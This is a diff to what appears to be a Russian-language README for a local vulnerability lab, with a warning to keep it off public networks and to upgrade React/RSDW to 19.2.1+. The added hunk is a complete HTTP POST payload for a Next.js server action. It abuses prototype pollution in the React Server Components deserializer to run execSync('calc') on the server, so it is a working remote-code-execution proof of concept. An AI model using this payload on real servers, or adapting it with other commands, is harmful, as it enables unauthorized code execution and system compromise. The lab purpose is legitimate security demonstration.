@@ -50,3 +50,29 @@ Content-Disposition: form-data; name="$ACTION_0:0"
 
 ## Безопасность
 Только для локальной лабы/dev. Не публиковать наружу. После демонстрации — обновить React/RSDW до 19.2.1+ и переписать генерацию отчётов без `exec`/конкатенации.
+
+
+Payload:
+POST / HTTP/1.1
+Host: xxx:3000
+User-Agent: Mozilla/5.0 
+Next-Action: x
+X-Nextjs-Request-Id: b5dce965
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad
+X-Nextjs-Html-Request-Id: SSTMXm7OJ_g0Ncx6jpQt9
+Content-Length: 565
+
+------WebKitFormBoundaryx8jO2oVc6SWP3Sad
+Content-Disposition: form-data; name="0"
+
+{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\"then\":\"$B1337\"}","_response":{"_prefix":"process.mainModule.require('child_process').execSync('calc');","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}
+------WebKitFormBoundaryx8jO2oVc6SWP3Sad
+Content-Disposition: form-data; name="1"
+
+"$@0"
+------WebKitFormBoundaryx8jO2oVc6SWP3Sad
+Content-Disposition: form-data; name="2"
+
+[]
+------WebKitFormBoundaryx8jO2oVc6SWP3Sad--
+
